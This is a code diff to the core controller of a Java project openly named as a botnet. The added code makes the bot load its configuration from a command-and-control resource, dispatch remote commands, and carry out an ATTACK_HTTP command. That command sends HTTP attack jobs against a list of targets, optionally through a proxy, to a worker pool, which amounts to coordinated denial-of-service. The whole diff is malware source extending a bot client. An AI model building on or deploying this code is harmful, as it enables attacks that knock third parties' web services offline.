@@ -28,11 +28,15 @@ package com.acmutv.botnet.core;
 
 import com.acmutv.botnet.config.AppConfiguration;
 import com.acmutv.botnet.config.AppConfigurationService;
+import com.acmutv.botnet.core.attack.HttpAttack;
 import com.acmutv.botnet.core.command.BotCommand;
 import com.acmutv.botnet.core.command.BotCommandService;
 import com.acmutv.botnet.core.exception.BotException;
 import com.acmutv.botnet.core.pool.BotPool;
 import com.acmutv.botnet.core.state.BotState;
+import com.acmutv.botnet.core.target.HttpTarget;
+import com.acmutv.botnet.tool.net.HttpMethod;
+import com.acmutv.botnet.tool.net.HttpProxy;
 import com.acmutv.botnet.tool.reflection.ReflectionManager;
 import com.acmutv.botnet.tool.runtime.RuntimeManager;
 import com.acmutv.botnet.tool.net.ConnectionManager;
@@ -42,12 +46,14 @@ import org.apache.logging.log4j.Logger;
 
 import java.beans.IntrospectionException;
 import java.io.FileInputStream;
+import java.io.FileNotFoundException;
 import java.io.IOException;
 import java.io.InputStream;
 import java.lang.reflect.InvocationTargetException;
 import java.net.SocketException;
 import java.net.UnknownHostException;
 import java.util.HashMap;
+import java.util.List;
 import java.util.Map;
 import java.util.concurrent.TimeUnit;
 
@@ -95,7 +101,8 @@ public class CoreController {
           break;
 
         case COMMAND:
-          cmd();
+          BotCommand cmd = getNextCommand();
+          executeCommands(cmd);
           break;
 
         case DEAD:
@@ -129,61 +136,69 @@ public class CoreController {
    * @throws  BotException when errors during botnet joining.
    */
   public static void joinBotnet() throws BotException {
-    throw new BotException();
+    LOGGER.traceEntry();
+    final String initResource = AppConfigurationService.getConfigurations().getInitResource();
+    LOGGER.info("Connecting to C&C at {}...", initResource);
+    try (InputStream in = new FileInputStream(initResource)) {
+      LOGGER.info("Loading remote configuration...");
+      AppConfigurationService.loadJson(in);
+    } catch (FileNotFoundException exc) {
+      throw new BotException("Cannot connect to C&C at %s", initResource);
+    } catch (IOException exc) {
+      LOGGER.warn("Cannot close connection to C&C. Cause: {}", exc.getMessage());
+    }
+    LOGGER.info("Bot is up and running");
+    changeState(BotState.COMMAND);
+    LOGGER.traceExit();
   }
 
   /**
    * Executes the state `CMD`.
+   * @param command the command to execute.
    * @throws  BotException when errors during `CMD` state.
    */
-  public static void cmd() throws BotException {
-    LOGGER.traceEntry();
-    LOGGER.info("Bot is up and running");
-    boolean loop = true;
+  public static void executeCommands(final BotCommand command) throws BotException {
+    LOGGER.traceEntry("command={}", command);
+    LOGGER.info("Received command {} with params={}", command.getScope(), command.getParams());
 
-    while (loop) {
+    switch (command.getScope()) {
 
-      BotCommand cmd = getNextCommand();
+      case RESTART:
+        final String resource = (String) command.getParams().get("resource");
+        restartBot((resource != null) ? resource : AppConfigurationService.getConfigurations().getInitResource());
+        break;
 
-      LOGGER.info("Received command {} with params={}", cmd.getScope(), cmd.getParams());
+      case UPDATE:
+        @SuppressWarnings("unchecked")
+        final Map<String,String> settings = (Map<String,String>) command.getParams().get("settings");
+        updateBot((settings != null) ? settings : new HashMap<>());
+        break;
 
-      switch (cmd.getScope()) {
+      case SLEEP:
+        final Duration sleepTimeout = (Duration) command.getParams().get("timeout");
+        sleep((sleepTimeout != null) ? sleepTimeout : new Duration(60, TimeUnit.SECONDS));
+        break;
 
-        case RESTART:
-          final String resource = (String) cmd.getParams().get("resource");
-          restartBot((resource != null) ? resource : AppConfigurationService.getConfigurations().getInitResource());
-          break;
+      case SHUTDOWN:
+        final Duration shutdownTimeout = (Duration) command.getParams().get("timeout");
+        shutdown((shutdownTimeout != null) ? shutdownTimeout : new Duration(60, TimeUnit.SECONDS));
+        break;
 
-        case UPDATE:
-          @SuppressWarnings("unchecked")
-          final Map<String,String> settings = (Map<String,String>) cmd.getParams().get("settings");
-          updateBot((settings != null) ? settings : new HashMap<>());
-          break;
+      case KILL:
+        kill();
+        break;
 
-        case SLEEP:
-          final Duration sleepTimeout = (Duration) cmd.getParams().get("timeout");
-          sleep((sleepTimeout != null) ? sleepTimeout : new Duration(60, TimeUnit.SECONDS));
-          break;
+      case ATTACK_HTTP:
+        final HttpMethod method = (HttpMethod) command.getParams().get("method");
+        @SuppressWarnings("unchecked")
+        final List<HttpTarget> targets = (List<HttpTarget>) command.getParams().get("targets");
+        final HttpProxy proxy = (HttpProxy) command.getParams().get("proxy");
+        executeHttpAttack(method, targets, proxy);
+        break;
 
-        case SHUTDOWN:
-          final Duration shutdownTimeout = (Duration) cmd.getParams().get("timeout");
-          shutdown((shutdownTimeout != null) ? shutdownTimeout : new Duration(60, TimeUnit.SECONDS));
-          loop = false;
-          break;
-
-        case KILL:
-          kill();
-          loop = false;
-          break;
-
-        case ATTACK_HTTP:
-          break;
-
-        default:
-          break;
-      }
+      default:
+        break;
     }
-    LOGGER.info("Bot is terminating ...");
     LOGGER.traceExit();
   }
 
@@ -308,6 +323,17 @@ public class CoreController {
     freeResources(null);
     LOGGER.info("Bot killed");
     changeState(BotState.DEAD);
+    LOGGER.traceExit();
+  }
+
+  public static void executeHttpAttack(HttpMethod method, List<HttpTarget> targets, HttpProxy proxy) {
+    LOGGER.traceEntry("method={} targets={} proxy={}", method, targets, proxy);
+    LOGGER.info("Scheduling attack...");
+    targets.stream().forEach(target -> {
+      HttpAttack attacker = new HttpAttack(method, target, proxy);
+      POOL.submit(attacker);
+    });
+    LOGGER.info("Attack scheduled");
     LOGGER.traceExit();
   }
 
